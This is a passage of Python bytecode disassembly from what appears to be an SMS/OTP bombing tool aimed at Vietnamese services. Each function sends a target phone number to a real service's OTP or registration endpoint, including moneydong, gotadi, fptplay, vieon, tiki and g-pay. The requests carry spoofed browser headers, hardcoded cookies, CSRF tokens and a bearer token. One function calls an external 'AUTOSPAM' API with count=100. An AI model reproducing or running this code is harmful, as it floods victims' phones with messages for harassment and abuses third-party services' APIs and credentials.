             14 LOAD_CONST               7 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             16 LOAD_CONST               8 ('"Android"')
             18 LOAD_CONST               9 ('https://h5.moneydong.vip')
             20 LOAD_CONST              10 ('same-site')
             22 LOAD_CONST              11 ('cors')
             24 LOAD_CONST              12 ('empty')
             26 LOAD_CONST              13 ('https://h5.moneydong.vip/')
             28 LOAD_CONST              14 ('gzip, deflate, br')
             30 LOAD_CONST              15 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             32 LOAD_CONST              16 (('Host', 'content-length', 'sec-ch-ua', 'accept', 'content-type', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding', 'accept-language'))
             34 BUILD_CONST_KEY_MAP     15
             36 STORE_FAST               1 (Headers)

575          38 LOAD_FAST                0 (phone)
             40 LOAD_CONST              17 (1)
             42 LOAD_CONST              18 (11)
             44 BUILD_SLICE              2
             46 BINARY_SUBSCR
             56 LOAD_CONST              19 ('2')
             58 LOAD_CONST              20 ('1')
             60 LOAD_CONST              21 ('69ad075c94c279e43608c5d50b77e8b9')
             62 LOAD_CONST              22 (('phone', 'type', 'ctype', 'chntoken'))
             64 BUILD_CONST_KEY_MAP      4
             66 STORE_FAST               2 (Payload)

576          68 LOAD_GLOBAL              1 (NULL + requests)
             80 LOAD_ATTR                1 (post)
             90 LOAD_CONST              23 ('https://api.moneydong.vip/h5/LoginMessage_ultimate')
             92 LOAD_FAST                2 (Payload)
             94 LOAD_FAST                1 (Headers)
             96 KW_NAMES                24
             98 PRECALL                  3
            102 CALL                     3
            112 STORE_FAST               3 (response)
            114 LOAD_CONST               0 (None)
            116 RETURN_VALUE

Disassembly of <code object gotadi at 0x7f48c6bd93b0, file "<x>", line 578>:
578           0 RESUME                   0

579           2 BUILD_MAP                0
              4 LOAD_CONST               1 ('Host')
              6 LOAD_CONST               2 ('api.gotadi.com')
              8 MAP_ADD                  1
             10 LOAD_CONST               3 ('content-length')
             12 LOAD_CONST               4 ('44')
             14 MAP_ADD                  1
             16 LOAD_CONST               5 ('sec-ch-ua')
             18 LOAD_CONST               6 ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"')
             20 MAP_ADD                  1
             22 LOAD_CONST               7 ('accept')
             24 LOAD_CONST               8 ('application/json')
             26 MAP_ADD                  1
             28 LOAD_CONST               9 ('sec-ch-ua-platform')
             30 LOAD_CONST              10 ('"Android"')
             32 MAP_ADD                  1
             34 LOAD_CONST              11 ('gtd-client-tracking-device-id')
             36 LOAD_CONST              12 ('85519cab-85d7-4881-abfa-65d2a2bb3a52')
             38 MAP_ADD                  1
             40 LOAD_CONST              13 ('sec-ch-ua-mobile')
             42 LOAD_CONST              14 ('?1')
             44 MAP_ADD                  1
             46 LOAD_CONST              15 ('user-agent')
             48 LOAD_CONST              16 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             50 MAP_ADD                  1
             52 LOAD_CONST              17 ('content-type')
             54 LOAD_CONST               8 ('application/json')
             56 MAP_ADD                  1
             58 LOAD_CONST              18 ('origin')
             60 LOAD_CONST              19 ('https://www.gotadi.com')
             62 MAP_ADD                  1
             64 LOAD_CONST              20 ('sec-fetch-site')
             66 LOAD_CONST              21 ('same-site')
             68 MAP_ADD                  1
             70 LOAD_CONST              22 ('sec-fetch-mode')
             72 LOAD_CONST              23 ('cors')
             74 MAP_ADD                  1
             76 LOAD_CONST              24 ('sec-fetch-dest')
             78 LOAD_CONST              25 ('empty')
             80 MAP_ADD                  1
             82 LOAD_CONST              26 ('referer')
             84 LOAD_CONST              27 ('https://www.gotadi.com/')
             86 MAP_ADD                  1
             88 LOAD_CONST              28 ('accept-encoding')
             90 LOAD_CONST              29 ('gzip, deflate, br')
             92 MAP_ADD                  1
             94 LOAD_CONST              30 ('accept-language')
             96 LOAD_CONST              31 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             98 MAP_ADD                  1
            100 STORE_FAST               1 (Headers)

580         102 LOAD_GLOBAL              1 (NULL + json)
            114 LOAD_ATTR                1 (dumps)
            124 LOAD_FAST                0 (phone)
            126 LOAD_CONST              32 ('VI')
            128 LOAD_CONST              33 (('phoneNumber', 'language'))
            130 BUILD_CONST_KEY_MAP      2
            132 PRECALL                  1
            136 CALL                     1
            146 STORE_FAST               2 (Datason)

581         148 LOAD_GLOBAL              5 (NULL + requests)
            160 LOAD_ATTR                3 (post)
            170 LOAD_CONST              34 ('https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp')
            172 LOAD_FAST                2 (Datason)
            174 LOAD_FAST                1 (Headers)
            176 KW_NAMES                35
            178 PRECALL                  3
            182 CALL                     3
            192 STORE_FAST               3 (response)
            194 LOAD_CONST               0 (None)
            196 RETURN_VALUE

Disassembly of <code object funring at 0x7f48c6df1680, file "<x>", line 583>:
583           0 RESUME                   0

584           2 LOAD_CONST               1 ('funring.vn')
              4 LOAD_CONST               2 ('keep-alive')
              6 LOAD_CONST               3 ('28')
              8 LOAD_CONST               4 ('*/*')
             10 LOAD_CONST               5 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             12 LOAD_CONST               6 ('application/json')
             14 LOAD_CONST               7 ('http://funring.vn')
             16 LOAD_CONST               8 ('http://funring.vn/module/register_mobile.jsp')
             18 LOAD_CONST               9 ('gzip, deflate')
             20 LOAD_CONST              10 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             22 LOAD_CONST              11 ('JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga=GA1.2.1626827841.1679236846; _gid=GA1.2.888694467.1679236846; _gat=1')
             24 LOAD_CONST              12 (('Host', 'Connection', 'Content-Length', 'Accept', 'User-Agent', 'Content-Type', 'Origin', 'Referer', 'Accept-Encoding', 'Accept-Language', 'Cookie'))
             26 BUILD_CONST_KEY_MAP     11
             28 STORE_FAST               1 (Headers)

585          30 LOAD_GLOBAL              1 (NULL + json)
             42 LOAD_ATTR                1 (dumps)
             52 LOAD_CONST              13 ('username')
             54 LOAD_FAST                0 (phone)
             56 LOAD_CONST              14 (1)
             58 LOAD_CONST              15 (11)
             60 BUILD_SLICE              2
             62 BINARY_SUBSCR
             72 BUILD_MAP                1
             74 PRECALL                  1
             78 CALL                     1
             88 STORE_FAST               2 (Datason)

586          90 LOAD_GLOBAL              5 (NULL + requests)
            102 LOAD_ATTR                3 (post)
            112 LOAD_CONST              16 ('http://funring.vn/api/v1.0.1/jersey/user/getotp')
            114 LOAD_FAST                2 (Datason)
            116 LOAD_FAST                1 (Headers)
            118 KW_NAMES                17
            120 PRECALL                  3
            124 CALL                     3
            134 STORE_FAST               3 (response)
            136 LOAD_CONST               0 (None)
            138 RETURN_VALUE

Disassembly of <code object call11 at 0x7f48c6df4c10, file "<x>", line 588>:
588           0 RESUME                   0

590           2 LOAD_CONST               1 ('643d8607c6ffe8.92935100')

592           4 LOAD_CONST               2 ('o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=')

593           6 LOAD_CONST               3 ('rfsd6jmf1e0daeapvmv1p0i6bu')

589           8 LOAD_CONST               4 (('OnCredit_id', 'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef', 'SN5c8116d5e6183'))
             10 BUILD_CONST_KEY_MAP      3
             12 STORE_FAST               1 (cookies)

597          14 LOAD_CONST               5 ('oncredit.vn')

598          16 LOAD_CONST               6 ('application/json, text/javascript, */*; q=0.01')

600          18 LOAD_CONST               7 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

601          20 LOAD_CONST               8 ('application/x-www-form-urlencoded; charset=UTF-8')

603          22 LOAD_CONST               9 ('https://oncredit.vn')

604          24 LOAD_CONST              10 ('https://oncredit.vn/registration')

605          26 LOAD_CONST              11 ('"Not:A-Brand";v="99", "Chromium";v="112"')

606          28 LOAD_CONST              12 ('?1')

607          30 LOAD_CONST              13 ('"Android"')

608          32 LOAD_CONST              14 ('empty')

609          34 LOAD_CONST              15 ('cors')

610          36 LOAD_CONST              16 ('same-origin')

612          38 LOAD_CONST              17 ('Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')

613          40 LOAD_CONST              18 ('XMLHttpRequest')

596          42 LOAD_CONST              19 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent', 'x-requested-with'))
             44 BUILD_CONST_KEY_MAP     14
             46 STORE_FAST               2 (headers)

618          48 LOAD_CONST              20 ('sendCodeReg')

620          50 LOAD_FAST                0 (phone)

622          52 LOAD_CONST              21 ('tv5v4v4v4c@gmail.com')

624          54 LOAD_CONST              22 ('1')

626          56 LOAD_CONST              23 ('vi')

628          58 LOAD_CONST              24 ('CSRFGuard_ajax')

630          60 LOAD_CONST              25 ('t8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi')

616          62 LOAD_CONST              26 (('data[typeData]', 'data[phone]', 'data[email]', 'data[captcha1]', 'data[lang]', 'CSRFName', 'CSRFToken'))
             64 BUILD_CONST_KEY_MAP      7
             66 STORE_FAST               3 (data)

633          68 LOAD_GLOBAL              1 (NULL + requests)
             80 LOAD_ATTR                1 (post)
             90 LOAD_CONST              27 ('https://oncredit.vn/?ajax')

634          92 LOAD_FAST                1 (cookies)

635          94 LOAD_FAST                2 (headers)

636          96 LOAD_FAST                3 (data)

633          98 KW_NAMES                28
            100 PRECALL                  4
            104 CALL                     4
            114 POP_TOP
            116 LOAD_CONST               0 (None)
            118 RETURN_VALUE

Disassembly of <code object fptplay at 0x7f48c6de4f30, file "<x>", line 638>:
638           0 RESUME                   0

639           2 LOAD_CONST               1 ('api.fptplay.net')
              4 LOAD_CONST               2 ('89')
              6 LOAD_CONST               3 ('"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"')
              8 LOAD_CONST               4 ('application/json, text/plain, */*')
             10 LOAD_CONST               5 ('application/json; charset=UTF-8')
             12 LOAD_CONST               6 ('?1')
             14 LOAD_CONST               7 ('Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')
             16 LOAD_CONST               8 ('"Android"')
             18 LOAD_CONST               9 ('https://fptplay.vn')
             20 LOAD_CONST              10 ('cross-site')
             22 LOAD_CONST              11 ('cors')
             24 LOAD_CONST              12 ('empty')
             26 LOAD_CONST              13 ('https://fptplay.vn/')
             28 LOAD_CONST              14 ('gzip, deflate, br')
             30 LOAD_CONST              15 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             32 LOAD_CONST              16 (('Host', 'content-length', 'sec-ch-ua', 'accept', 'content-type', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding', 'accept-language'))
             34 BUILD_CONST_KEY_MAP     15
             36 STORE_FAST               1 (Headers)

640          38 LOAD_GLOBAL              1 (NULL + json)
             50 LOAD_ATTR                1 (dumps)
             60 LOAD_FAST                0 (phone)
             62 LOAD_CONST              17 ('VN')
             64 LOAD_CONST              18 ('vKyPNd1iWHodQVknxcvZoWz74295wnk8')
             66 LOAD_CONST              19 (('phone', 'country_code', 'client_id'))
             68 BUILD_CONST_KEY_MAP      3
             70 PRECALL                  1
             74 CALL                     1
             84 STORE_FAST               2 (Datason)

641          86 LOAD_GLOBAL              5 (NULL + requests)
             98 LOAD_ATTR                3 (post)
            108 LOAD_CONST              20 ('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%253A112.0.0.0)&drm=1')
            110 LOAD_FAST                2 (Datason)
            112 LOAD_FAST                1 (Headers)
            114 KW_NAMES                21
            116 PRECALL                  3
            120 CALL                     3
            130 STORE_FAST               3 (response)
            132 LOAD_CONST               0 (None)
            134 RETURN_VALUE

Disassembly of <code object vietid at 0x127e260, file "<x>", line 643>:
643           0 RESUME                   0

644           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F')
             26 PRECALL                  1
             30 CALL                     1
             40 LOAD_ATTR                2 (text)
             50 STORE_FAST               1 (csrfget)

645          52 LOAD_FAST                1 (csrfget)
             54 LOAD_METHOD              3 (split)
             76 LOAD_CONST               2 ('name="csrf-token" value="')
             78 PRECALL                  1
             82 CALL                     1
             92 LOAD_CONST               3 (1)
             94 BINARY_SUBSCR
            104 LOAD_METHOD              3 (split)
            126 LOAD_CONST               4 ('"/>')
            128 PRECALL                  1
            132 CALL                     1
            142 LOAD_CONST               5 (0)
            144 BINARY_SUBSCR
            154 STORE_FAST               2 (csrf)

646         156 BUILD_MAP                0
            158 LOAD_CONST               6 ('Host')
            160 LOAD_CONST               7 ('oauth.vietid.net')
            162 MAP_ADD                  1
            164 LOAD_CONST               8 ('content-length')
            166 LOAD_CONST               9 ('41')
            168 MAP_ADD                  1
            170 LOAD_CONST              10 ('cache-control')
            172 LOAD_CONST              11 ('max-age=0')
            174 MAP_ADD                  1
            176 LOAD_CONST              12 ('sec-ch-ua')
            178 LOAD_CONST              13 ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"')
            180 MAP_ADD                  1
            182 LOAD_CONST              14 ('sec-ch-ua-mobile')
            184 LOAD_CONST              15 ('?1')
            186 MAP_ADD                  1
            188 LOAD_CONST              16 ('sec-ch-ua-platform')
            190 LOAD_CONST              17 ('"Android"')
            192 MAP_ADD                  1
            194 LOAD_CONST              18 ('upgrade-insecure-requests')
            196 LOAD_CONST              19 ('1')
            198 MAP_ADD                  1
            200 LOAD_CONST              20 ('origin')
            202 LOAD_CONST              21 ('https://oauth.vietid.net')
            204 MAP_ADD                  1
            206 LOAD_CONST              22 ('content-type')
            208 LOAD_CONST              23 ('application/x-www-form-urlencoded')
            210 MAP_ADD                  1
            212 LOAD_CONST              24 ('user-agent')
            214 LOAD_CONST              25 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
            216 MAP_ADD                  1
            218 LOAD_CONST              26 ('accept')
            220 LOAD_CONST              27 ('text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7')
            222 MAP_ADD                  1
            224 LOAD_CONST              28 ('sec-fetch-site')
            226 LOAD_CONST              29 ('same-origin')
            228 MAP_ADD                  1
            230 LOAD_CONST              30 ('sec-fetch-mode')
            232 LOAD_CONST              31 ('navigate')
            234 MAP_ADD                  1
            236 LOAD_CONST              32 ('sec-fetch-user')
            238 LOAD_CONST              15 ('?1')
            240 MAP_ADD                  1
            242 LOAD_CONST              33 ('sec-fetch-dest')
            244 LOAD_CONST              34 ('document')
            246 MAP_ADD                  1
            248 LOAD_CONST              35 ('referer')
            250 LOAD_CONST               1 ('https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F')
            252 MAP_ADD                  1
            254 LOAD_CONST              36 ('accept-encoding')
            256 LOAD_CONST              37 ('gzip, deflate, br')
            258 MAP_ADD                  1
            260 LOAD_CONST              38 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
            262 LOAD_CONST              39 ('_ga_H5VRTZBFLG=GS1.1.1679234987.1.0.1679234987.0.0.0')
            264 LOAD_CONST              40 (('accept-language', 'cookie'))
            266 BUILD_CONST_KEY_MAP      2
            268 DICT_UPDATE              1
            270 STORE_FAST               3 (Headers)

647         272 LOAD_FAST                2 (csrf)
            274 LOAD_FAST                0 (phone)
            276 LOAD_CONST              41 (('csrf-token', 'account'))
            278 BUILD_CONST_KEY_MAP      2
            280 STORE_FAST               4 (Payload)

648         282 LOAD_GLOBAL              1 (NULL + requests)
            294 LOAD_ATTR                1 (post)
            304 LOAD_CONST               1 ('https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F')
            306 LOAD_FAST                4 (Payload)
            308 LOAD_FAST                3 (Headers)
            310 KW_NAMES                42
            312 PRECALL                  3
            316 CALL                     3
            326 STORE_FAST               5 (response)
            328 LOAD_CONST               0 (None)
            330 RETURN_VALUE

Disassembly of <code object ahamove at 0x7f48c6bd96b0, file "<x>", line 650>:
650           0 RESUME                   0

651           2 LOAD_GLOBAL              1 (NULL + random_string)
             14 LOAD_CONST               1 (6)
             16 PRECALL                  1
             20 CALL                     1
             30 STORE_FAST               1 (mail)

652          32 LOAD_CONST               2 ('api.ahamove.com')
             34 LOAD_CONST               3 ('114')
             36 LOAD_CONST               4 ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"')
             38 LOAD_CONST               5 ('application/json, text/plain, */*')
             40 LOAD_CONST               6 ('application/json;charset=UTF-8')
             42 LOAD_CONST               7 ('?1')
             44 LOAD_CONST               8 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             46 LOAD_CONST               9 ('"Android"')
             48 LOAD_CONST              10 ('https://app.ahamove.com')
             50 LOAD_CONST              11 ('same-site')
             52 LOAD_CONST              12 ('cors')
             54 LOAD_CONST              13 ('empty')
             56 LOAD_CONST              14 ('https://app.ahamove.com/')
             58 LOAD_CONST              15 ('gzip, deflate, br')
             60 LOAD_CONST              16 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             62 LOAD_CONST              17 (('Host', 'content-length', 'sec-ch-ua', 'accept', 'content-type', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding', 'accept-language'))
             64 BUILD_CONST_KEY_MAP     15
             66 STORE_FAST               2 (Headers)

653          68 LOAD_GLOBAL              3 (NULL + json)
             80 LOAD_ATTR                2 (dumps)
             90 LOAD_FAST                0 (phone)
             92 LOAD_CONST              18 (1)
             94 LOAD_CONST              19 (11)
             96 BUILD_SLICE              2
             98 BINARY_SUBSCR
            108 FORMAT_VALUE             0
            110 LOAD_CONST              20 ('Tuấn')
            112 LOAD_FAST                1 (mail)
            114 FORMAT_VALUE             0
            116 LOAD_CONST              21 ('@gmail.com')
            118 BUILD_STRING             2
            120 LOAD_CONST              22 ('VN')
            122 LOAD_CONST              23 ('true')
            124 LOAD_CONST              24 (('mobile', 'name', 'email', 'country_code', 'firebase_sms_auth'))
            126 BUILD_CONST_KEY_MAP      5
            128 PRECALL                  1
            132 CALL                     1
            142 STORE_FAST               3 (Datason)

654         144 LOAD_GLOBAL              7 (NULL + requests)
            156 LOAD_ATTR                4 (post)
            166 LOAD_CONST              25 ('https://api.ahamove.com/api/v3/public/user/register')
            168 LOAD_FAST                3 (Datason)
            170 LOAD_FAST                2 (Headers)
            172 KW_NAMES                26
            174 PRECALL                  3
            178 CALL                     3
            188 STORE_FAST               4 (Response)
            190 LOAD_CONST               0 (None)
            192 RETURN_VALUE

Disassembly of <code object vieon1 at 0x7f48c6de5bb0, file "<x>", line 656>:
656           0 RESUME                   0

657           2 LOAD_CONST               1 ('api.vieon.vn')
              4 LOAD_CONST               2 ('201')
              6 LOAD_CONST               3 ('application/json, text/plain, */*')
              8 LOAD_CONST               4 ('application/x-www-form-urlencoded')
             10 LOAD_CONST               5 ('?1')
             12 LOAD_CONST               6 ('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4')
             14 LOAD_CONST               7 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             16 LOAD_CONST               8 ('"Android"')
             18 LOAD_CONST               9 ('https://vieon.vn')
             20 LOAD_CONST              10 ('same-site')
             22 LOAD_CONST              11 ('cors')
             24 LOAD_CONST              12 ('empty')
             26 LOAD_CONST              13 ('https://vieon.vn/?utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite&utm_content=p_--k_vieon&pid=approi&c=approi_VieON_SEM_Brand_BOS_Exact&af_adset=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B&af_force_deeplink=false&gclid=CjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE')
             28 LOAD_CONST              14 ('gzip, deflate, br')
             30 LOAD_CONST              15 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             32 LOAD_CONST              16 (('Host', 'content-length', 'accept', 'content-type', 'sec-ch-ua-mobile', 'authorization', 'user-agent', 'sec-ch-ua-platform', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding', 'accept-language'))
             34 BUILD_CONST_KEY_MAP     15
             36 STORE_FAST               1 (Headers)

658          38 LOAD_CONST              17 ('mobile_web')
             40 LOAD_CONST              18 ('012021')
             42 LOAD_CONST              19 (('platform', 'ui'))
             44 BUILD_CONST_KEY_MAP      2
             46 STORE_FAST               2 (Params)

659          48 LOAD_FAST                0 (phone)
             50 LOAD_CONST              20 ('Vexx007')
             52 LOAD_CONST              21 ('')
             54 LOAD_CONST              22 ('7c775cd1cd49a31c3893ca1e09abbde3')
             56 LOAD_CONST              17 ('mobile_web')
             58 LOAD_CONST              23 ('Android%2010')
             60 LOAD_CONST              21 ('')
             62 LOAD_CONST              24 ('Chrome%2F110')
             64 LOAD_CONST              25 ('desktop')
             66 LOAD_CONST              18 ('012021')
             68 LOAD_CONST              26 (('phone_number', 'password', 'given_name', 'device_id', 'platform', 'model', 'push_token', 'device_name', 'device_type', 'ui'))
             70 BUILD_CONST_KEY_MAP     10
             72 STORE_FAST               3 (Payload)

660          74 LOAD_GLOBAL              1 (NULL + requests)
             86 LOAD_ATTR                1 (post)
             96 LOAD_CONST              27 ('https://api.vieon.vn/backend/user/register/mobile')
             98 LOAD_FAST                2 (Params)
            100 LOAD_FAST                3 (Payload)
            102 LOAD_FAST                1 (Headers)
            104 KW_NAMES                28
            106 PRECALL                  4
            110 CALL                     4
            120 STORE_FAST               4 (response)
            122 LOAD_CONST               0 (None)
            124 RETURN_VALUE

Disassembly of <code object tiki at 0x7f48c6da3aa0, file "<x>", line 662>:
662           0 RESUME                   0

663           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://tiki.vn/api/v2/customers/otp_codes')
             26 LOAD_GLOBAL              4 (ua)
             38 LOAD_GLOBAL              6 (jsdt)
             50 KW_NAMES                 2
             52 PRECALL                  3
             56 CALL                     3
             66 LOAD_ATTR                4 (text)
             76 STORE_FAST               1 (response_tiki)
             78 LOAD_CONST               0 (None)
             80 RETURN_VALUE

Disassembly of <code object apiv5 at 0x7f48c6da3bb0, file "<x>", line 665>:
665           0 RESUME                   0

666           2 LOAD_CONST               1 ('https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={}')
              4 LOAD_METHOD              0 (format)
             26 LOAD_FAST                0 (phone)
             28 PRECALL                  1
             32 CALL                     1
             42 STORE_FAST               1 (url)

667          44 LOAD_GLOBAL              3 (NULL + requests)
             56 LOAD_ATTR                2 (post)
             66 LOAD_FAST                1 (url)
             68 PRECALL                  1
             72 CALL                     1
             82 POP_TOP
             84 LOAD_CONST               0 (None)
             86 RETURN_VALUE

Disassembly of <code object moca at 0x7f48c6d71620, file "<x>", line 669>:
669           0 RESUME                   0

670           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://moca.vn/moca/v2/users/role')
             26 LOAD_GLOBAL              4 (paramss)
             38 LOAD_GLOBAL              6 (headerss)
             50 KW_NAMES                 2
             52 PRECALL                  3
             56 CALL                     3
             66 LOAD_METHOD              4 (json)
             88 PRECALL                  0
             92 CALL                     0
            102 STORE_FAST               1 (home)

671         104 LOAD_FAST                1 (home)
            106 LOAD_CONST               3 ('data')
            108 BINARY_SUBSCR
            118 LOAD_CONST               4 ('registrationId')
            120 BINARY_SUBSCR
            130 STORE_FAST               2 (token)

672         132 LOAD_GLOBAL              1 (NULL + requests)
            144 LOAD_ATTR                5 (post)
            154 LOAD_CONST               5 ('https://moca.vn/moca/v2/users/registrations/')
            156 LOAD_FAST                2 (token)
            158 FORMAT_VALUE             0
            160 LOAD_CONST               6 ('/verification')
            162 BUILD_STRING             3
            164 LOAD_GLOBAL              6 (headerss)
            176 KW_NAMES                 7
            178 PRECALL                  2
            182 CALL                     2
            192 LOAD_METHOD              4 (json)
            214 PRECALL                  0
            218 CALL                     0
            228 STORE_FAST               3 (response)
            230 LOAD_CONST               0 (None)
            232 RETURN_VALUE

Disassembly of <code object gbay at 0x7f48c6de5070, file "<x>", line 673>:
673           0 RESUME                   0

674           2 LOAD_FAST                0 (phone)
              4 LOAD_GLOBAL              1 (NULL + random_string)
             16 LOAD_CONST               1 (40)
             18 PRECALL                  1
             22 CALL                     1
             32 LOAD_CONST               2 (('phone_number', 'hash'))
             34 BUILD_CONST_KEY_MAP      2
             36 STORE_FAST               1 (json_data)

675          38 LOAD_GLOBAL              3 (NULL + requests)
             50 LOAD_ATTR                2 (post)
             60 LOAD_CONST               3 ('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone')
             62 LOAD_FAST                1 (json_data)
             64 KW_NAMES                 4
             66 PRECALL                  2
             70 CALL                     2
             80 LOAD_METHOD              3 (json)
            102 PRECALL                  0
            106 CALL                     0
            116 POP_TOP
            118 LOAD_CONST               0 (None)
            120 RETURN_VALUE

Disassembly of <code object viettel at 0x7f48c6bd9830, file "<x>", line 677>:
677           0 RESUME                   0

679           2 LOAD_CONST               1 ('XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv')

680           4 LOAD_CONST               2 ('1.1.307401310.1685096321')

681           6 LOAD_CONST               3 ('GA1.2.1786782073.1685096321')

682           8 LOAD_CONST               4 ('fb.1.1685096322884.1341401421')

